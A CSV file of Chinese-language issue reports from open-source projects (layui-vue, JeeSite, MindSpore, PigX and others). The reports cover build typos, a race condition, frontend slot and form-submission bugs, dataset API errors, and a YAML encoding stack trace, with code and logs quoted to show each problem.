title,text
Development_Preparation.md 中笔误？,源自 https://www.v2ex.com/t/596783#r_7837863 无法编译的注意： 文档中实际上是。   <code>: GN_AR GN_AR_COMPILER
收集数存在bug,"survey.setAnswerNum(answerNum+1);此处存在并发问题   <code>: public void saveAnswer(SurveyAnswer surveyAnswer, Map&lt;String, Map&lt;String, Object&gt;&gt; quMaps) { Date curDate=new Date(); Session session=this.getSession(); //保存答案信息 String surveyId=surveyAnswer.getSurveyId(); // Survey survey=(Survey) session.get(Survey.class, surveyId); SurveyDirectory survey=(SurveyDirectory) session.get(SurveyDirectory.class, surveyId); Integer answerNum = survey.getAnswerNum(); if(answerNum==null){ answerNum=0; } survey.setAnswerNum(answerNum+1); session.update(survey);//更新回答数"
pageHeader 组件 backIcon 插槽无法在 html 文件中使用,"pageHeader 组件 backIcon 插槽无法在 html 文件中使用 HTML 1.7.7   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""en""&gt; &lt;head&gt; &lt;meta charset=""UTF-8""&gt; &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1.0""&gt; &lt;link rel=""stylesheet"" type=""text/css"" href=""https://unpkg.com/@layui/layui-vue/lib/index.css""&gt; &lt;script type=""importmap""&gt; { ""imports"": { ""vue"": ""https://unpkg.com/vue@3/dist/vue.esm-browser.js"", ""layui"": ""https://unpkg.com/@layui/layui-vue/lib/index.js"" } } &lt;/script&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=""app""&gt; &lt;lay-page-header&gt; &lt;template v-slot:backIcon&gt;&lt;/template&gt; &lt;template v-slot:back-icon&gt; &lt;/template&gt; &lt;template v-slot:default&gt;标题&lt;/template&gt; &lt;/lay-page-header&gt; &lt;/div&gt; &lt;script type=""module""&gt; import {createApp} from 'vue' import Layui from 'layui' const App={ setup() { return { } }, } const app=createApp(App) app.use(Layui) app.mount('#app') &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
列表提交怎么实现,"表单提交列表属性的时候报错。目前有个办法是手动修改属性,如下，但是略麻烦些，请问下有更简便的方式吗？ org.springframework.beans.InvalidPropertyException: Invalid property 'list[0][id]' of bean class [com.jeesite.modules.biz.model.XXX]: Property referenced in indexed property path 'list[0][id]' is neither an array nor a List nor a Map; returned value was   <code>: list[0][id]: 1360824978603364352 list[0][name]: 6.4 list[1][id]: 1360824978683056128 list[1][name]: 3.125 改成 list[0].id: 1360824978603364352 list[0].name: 6.4 list[1].id: 1360824978683056128 list[1].name: 3.125 let list = []; for(i=0;i&lt;3;i++){ list.push({id : 1, name : 'n1'}); } js.ajaxSubmit('${ctxPath}/a/biz/xxx/update', {list:list}, function(data){ log(data) });"
导出excel  没有关闭loading，success不执行,"`js.ajaxSubmitForm($('#searchForm'), { url:'${ctx}/caterOrder/export', downloadFile:true, beforeSubmit: function () { js.loading('正在导出数据中，请您耐心等待....'); 导出excel 提示已经下载完成，没有关闭loading，success不执行，这里那里有问题吗？   <code>: }, success: function (data,status,xhr) { js.closeLoading(2000, true); }, error: function (error) { js.showErrorMessage(error); } });`"
属性重复,"CoreCms.Net.Web.Admin\wwwroot\views\content\customform\form\create.html CoreCms.Net.Web.Admin\wwwroot\views\content\customform\form\edit.html placeholder重复   <code>: &lt;textarea name=""description"" id=""description"" lay-verify=""required|verifydescription"" placeholder=""请输入内容"" class=""layui-textarea"" lay-reqText=""请输入表单描述"" placeholder=""请输入表单描述""&gt;&lt;/textarea&gt;"
TensorScatterUpdate算子对不同shape处理结果与pytorch的scatter_不一致,"运行结果： rr.mean()的输出   <code>: import torch import numpy as np from torch.nn import functional as fun if __name__ == '__main__': B, C, H, W = 37, 80, 28, 28 x = 784 mask_logits = np.random.random((B, C, H, W)) mask_logits_t = mask_logits mask_logits_m = mask_logits for _ in range(3): point_logits = np.random.random((B, C, x)) points_idx = np.random.randint(low=0, high=H * W, size=(B, x)) mask_logits_t = fun.interpolate( torch.Tensor(mask_logits_t), scale_factor=2, mode=""bilinear"", align_corners=False ) _, _, H, W = mask_logits_t.shape points_idx_ = torch.Tensor(points_idx).unsqueeze(1).expand(-1, C, -1).to(torch.int64) # (37, 80, 784) point_logits_ = torch.Tensor(point_logits) # (37, 80, 784) mask_logits_t = ( mask_logits_t.reshape(B, C, H * W) .scatter_(2, points_idx_, point_logits_) .view(B, C, H, W) ).cpu().numpy() from mindspore import ops, Tensor import mindspore cast = ops.Cast() mask_logits_m = fun.interpolate( torch.Tensor(mask_logits_m), scale_factor=2, mode=""bilinear"", align_corners=False ).cpu().numpy() # scatter_实现，使用ops.TensorScatterUpdate算子 scatter_ = ops.TensorScatterUpdate() zeros = ops.Zeros() points_index = zeros((B, x, 2), mindspore.int32) # (37, 784, 2) points_index[:, :, 0] = (Tensor(points_idx) % W).astype(mindspore.int32) points_index[:, :, 1] = (Tensor(points_idx) // W).astype(mindspore.int32) transpose = ops.Transpose() point_logits = transpose(Tensor(point_logits), (0, 2, 1)) # (37, 784, 80) mask_logits_m = transpose(Tensor(mask_logits_m), (0, 2, 3, 1)) # (37, H, W, 80) print(mask_logits_m.shape) mask_logits_m = cast(mask_logits_m, mindspore.float32) points_index = cast(points_index, mindspore.int32) point_logits = cast(point_logits, mindspore.float32) for b in range(B): mask_logits_m[b] = scatter_(mask_logits_m[b], points_index[b], point_logits[b]) mask_logits_m = transpose(mask_logits_m, (0, 3, 1, 2)).asnumpy() # print(mask_logits_m) rr = mask_logits_t - mask_logits_m rr = np.abs(rr) print(rr.mean())"
get_dataset_size 在有些参数下返回错误,": 依瞳系统下 device ascend /device gpu /device cpu : -- MindSpore version :mindspore-ascend 1.1.0 -- Python version : 发现升级到1.10版本后，mindspore.dataset ImageFolderDataset生成的数据集，在有extensions=["".jpg"", "".jpeg"", "".JPEG""] 参数的时候，get_dataset_size()会错误的返回0 ，而没有这个参数，返回正常。 hymenoptera_data 目录下是train目录，train目录下是两个目录，分别放着蜜蜂和蚂蚁的jpg图片。   <code>: import mindspore.dataset as ds import os data_path = ""./hymenoptera_data/"" batch_size = 32 ds_train = ds.ImageFolderDataset(os.path.join(data_path, ""train""), decode=True, extensions=["".jpg"", "".jpeg"", "".JPEG""] ) print(ds_train.get_dataset_size()) ds_train = ds_train.batch(batch_size, drop_remainder=True) print(ds_train.get_dataset_size()) ds_train = ds.ImageFolderDataset(os.path.join(data_path, ""train""), decode=True ) print(ds_train.get_dataset_size()) ds_train = ds_train.batch(batch_size, drop_remainder=True) print(ds_train.get_dataset_size()) 0 0 244 7"
 请问环境变量设置在哪里？,您好！请问下面文件描述的环境配置文件路径是在什么？谢谢! 1、IS_DEMO 设置环境变量 的值为 可以是PSI处于演示状态，在演示状态下admin用户的登录密码不能被修改，从而避免了演示环境被恶意破坏。 2、PSI_SESSION_IN_DB 设置环境变量 的值为 可以把Seesion保存在数据库中，这样在重启Web服务器后用户的登录信息仍能保存。 3、PSI_UnitTest   <code>: IS_DEMO 1 PSI_SESSION_IN_DB 1
运行pigx_gateway 报 org.yaml.snakeyaml.error.YAMLException: java.nio.charset.MalformedInputException: Input length = 1,"pigx版本: 3.0 操作系统: windows server 2012 R2 是否修改包名: 否 在开发环境(win7)运行pigx_gateway.jar不会出错 在测试环境(windows server 2012 R2)出现这错误 经百度，说是application-dev.yml里有中文，在nacos里将application-dev.yml中的中文去掉，运行正常 两个环境都是通过pigxx提供的SQL脚本构建的，尝试修改mysql的字符集，但都运行出错   <code>: 2019-06-11 11:31:24.452 INFO 5400 --- [ main] o.s.c.a.n.c.NacosPropertySourceBuilder : Loading nacos data, dataId: 'application-dev.yml', group: 'DEFAULT_GROUP' 2019-06-11 11:31:24.452 ERROR 5400 --- [ main] o.s.c.a.n.c.NacosPropertySourceBuilder : parse data from Nacos error,dataId:application-dev.yml,data:# 加解密根密码 jasypt: encryptor: password: pigx #根密码 # redis 相关 spring: redis: password: host: ${REDIS-HOST:pigx-redis} # 暴露监控端点 management: endpoints: web: exposure: include: '*' # feign 配置 feign: hystrix: enabled: true okhttp: enabled: true httpclient: enabled: false client: config: default: connectTimeout: 10000 readTimeout: 10000 compression: request: enabled: true response: enabled: true # hystrix If you need to use ThreadLocal bound variables in your RequestInterceptor`s # you will need to either set the thread isolation strategy for Hystrix to `SEMAPHORE or disable Hystrix in Feign. hystrix: command: default: execution: isolation: strategy: SEMAPHORE thread: timeoutInMilliseconds: 60000 shareSecurityContext: true #请求处理的超时时间 ribbon: ReadTimeout: 10000 ConnectTimeout: 10000 # mybaits-plus配置 mybatis-plus: # MyBatis Mapper所对应的XML文件位置 mapper-locations: classpath:/mapper/*Mapper.xml global-config: # 关闭MP3.0自带的banner banner: false db-config: # 主键类型 id-type: auto #swagger公共信息 swagger: title: PigX Swagger API description: 全宇宙最牛逼的Spring Cloud微服务开发脚手架 license: Powered By PigX licenseUrl: https://pig4cloud.com/ terms-of-service-url: https://pig4cloud.com/ contact: name: 冷冷 email: wangiegie@gmail.com url: https://pig4cloud.com/about.html authorization: name: pigX OAuth auth-regex: ^.*$ authorization-scope-list: - scope: server description: server all token-url-list: - http://${GATEWAY-HOST:pigx-gateway}:${GATEWAY-PORT:9999}/auth/oauth/token ## spring security 配置 security: oauth2: client: # 默认放行url,如果子模块重写这里的配置就会被覆盖 ignore-urls: - /actuator/** - /v2/api-docs resource: loadBalanced: true token-info-uri: http://${AUTH-HOST:pigx-auth}/oauth/check_token, org.yaml.snakeyaml.error.YAMLException: java.nio.charset.MalformedInputException: Input length = 1 at org.yaml.snakeyaml.reader.StreamReader.update(StreamReader.java:218) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.ensureEnoughData(StreamReader.java:176) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.ensureEnoughData(StreamReader.java:171) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.peek(StreamReader.java:126) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.scanner.ScannerImpl.scanToNextToken(ScannerImpl.java:1177) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.scanner.ScannerImpl.fetchMoreTokens(ScannerImpl.java:287) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.scanner.ScannerImpl.checkToken(ScannerImpl.java:227) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.parser.ParserImpl$ParseImplicitDocumentStart.produce(ParserImpl.java:195) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.parser.ParserImpl.peekEvent(ParserImpl.java:158) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.parser.ParserImpl.checkEvent(ParserImpl.java:148) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.composer.Composer.checkNode(Composer.java:72) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.constructor.BaseConstructor.checkData(BaseConstructor.java:112) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.Yaml$1.hasNext(Yaml.java:542) ~[snakeyaml-1.23.jar!/:na] at org.springframework.beans.factory.config.YamlProcessor.process(YamlProcessor.java:160) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.beans.factory.config.YamlProcessor.process(YamlProcessor.java:134) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.beans.factory.config.YamlPropertiesFactoryBean.createProperties(YamlPropertiesFactoryBean.java:135) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.beans.factory.config.YamlPropertiesFactoryBean.getObject(YamlPropertiesFactoryBean.java:115) ~[spring-beans-5.1.6.RELEASE.jar!/:5.1.6.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceBuilder.loadNacosData(NacosPropertySourceBuilder.java:100) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceBuilder.build(NacosPropertySourceBuilder.java:75) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceLocator.loadNacosDataIfPresent(NacosPropertySourceLocator.java:179) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceLocator.loadSharedConfiguration(NacosPropertySourceLocator.java:111) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.alibaba.nacos.client.NacosPropertySourceLocator.locate(NacosPropertySourceLocator.java:86) [spring-cloud-alibaba-nacos-config-0.9.0.RELEASE.jar!/:0.9.0.RELEASE] at org.springframework.cloud.bootstrap.config.PropertySourceBootstrapConfiguration.initialize(PropertySourceBootstrapConfiguration.java:97) [spring-cloud-context-2.1.1.RELEASE.jar!/:2.1.1.RELEASE] at org.springframework.boot.SpringApplication.applyInitializers(SpringApplication.java:649) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.prepareContext(SpringApplication.java:373) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1260) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1248) [spring-boot-2.1.4.RELEASE.jar!/:2.1.4.RELEASE] at com.pig4cloud.pigx.gateway.PigxGatewayApplication.main(PigxGatewayApplication.java:37) [classes!/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_162] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_162] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_162] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_162] at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) [pigx-gateway.jar:na] at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) [pigx-gateway.jar:na] at org.springframework.boot.loader.Launcher.launch(Launcher.java:50) [pigx-gateway.jar:na] at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:51) [pigx-gateway.jar:na] Caused by: java.nio.charset.MalformedInputException: Input length = 1 at java.nio.charset.CoderResult.throwException(CoderResult.java:281) ~[na:1.8.0_162] at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:339) ~[na:1.8.0_162] at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178) ~[na:1.8.0_162] at java.io.InputStreamReader.read(InputStreamReader.java:184) ~[na:1.8.0_162] at org.yaml.snakeyaml.reader.UnicodeReader.read(UnicodeReader.java:125) ~[snakeyaml-1.23.jar!/:na] at org.yaml.snakeyaml.reader.StreamReader.update(StreamReader.java:183) ~[snakeyaml-1.23.jar!/:na] ... 36 common frames omitted"
